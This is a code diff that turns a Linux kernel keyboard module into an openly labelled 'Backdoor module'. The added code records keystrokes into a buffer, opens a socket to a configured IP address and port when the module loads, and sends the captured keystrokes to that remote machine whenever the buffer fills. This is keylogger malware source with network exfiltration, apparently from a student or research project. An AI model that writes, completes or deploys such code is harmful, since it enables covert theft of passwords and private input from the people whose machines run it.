@@ -4,34 +4,50 @@
 #include <linux/keyboard.h>
 #include <linux/irq.h>
 #include <linux/interrupt.h>
+#include <linux/delay.h>
 
-#define KBD_IRQ 1  // Keyboard IRQ number
+#include "backdoor.h"
+#include "networking.h"
 
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Gabriel Franceschi Libardi");
+MODULE_AUTHOR("Gustavo Moura Scarenci");
+MODULE_AUTHOR("Artur Brenner Weber");
+MODULE_DESCRIPTION("A module that sends kernel information via socket to another machine");
+MODULE_VERSION("0.1");
+
+static struct notifier_block keyboard_notifier_block = {
+    .notifier_call = keyboard_notifier_callback,
+};
+
+// Keyboard stroke buffer
+static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 
 
 // Keyboard interrupt handler
-irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
-{
+irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
+    static int32_t buffer_count = 0; // Counts how many chars have been logged.
     struct keyboard_notifier_param *param = dev_id;
 
     if (param && param->value) {
-        unsigned int keycode = param->value;
+        uint32_t keycode = param->value;
+        char key = (char) keycode; // Convert keycode to char
 
-        // Convert keycode to char
-        char key = (char) keycode;
+        keystrokes[buffer_count] = key;
+        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
-        // Process the key as per your requirements
-        printk(KERN_INFO "Key pressed: %c\n", key);
+        printk(KERN_INFO "Buffer: %s\n", keystrokes);
+        printk(KERN_INFO "Buffer size: %d\n", buffer_count);
 
-        // Store the key in a linked list or perform any other required operation
+        if (buffer_count == 0) {
+            send_message(keystrokes);
+        }
     }
 
     return IRQ_NONE;
 }
 
 // Keyboard notifier callback
-int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param)
-{
+int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
 
     if (code == KBD_KEYSYM && param && param->down) {
@@ -42,13 +58,15 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
     return NOTIFY_OK;
 }
 
-static struct notifier_block keyboard_notifier_block = {
-    .notifier_call = keyboard_notifier_callback,
-};
 
-static int __init keyboard_module_init(void)
-{
+static int __init keyboard_module_init(void) {
     int result;
+
+    result = create_socket(IP_ADDRESS, PORT);
+    if (result < 0) {
+        printk(KERN_ERR "Failed to connect\n");
+        return result;
+    }
 
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
@@ -57,16 +75,21 @@ static int __init keyboard_module_init(void)
         return result;
     }
 
-    printk(KERN_INFO "Keyboard module initialized\n");
+    printk(KERN_INFO "Backdoor module initialized\n");
     return 0;
 }
 
-static void __exit keyboard_module_exit(void)
-{
+static void __exit keyboard_module_exit(void) {
+    int ret;
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
+    ret = shutdown_socket();
 
-    printk(KERN_INFO "Keyboard module exited\n");
+    if (ret < 0) {
+	printk(KERN_ERR "Unable to release socket");
+	return;
+    }
+    printk(KERN_INFO "Backdoor module exited\n");
 }
 
 module_init(keyboard_module_init);
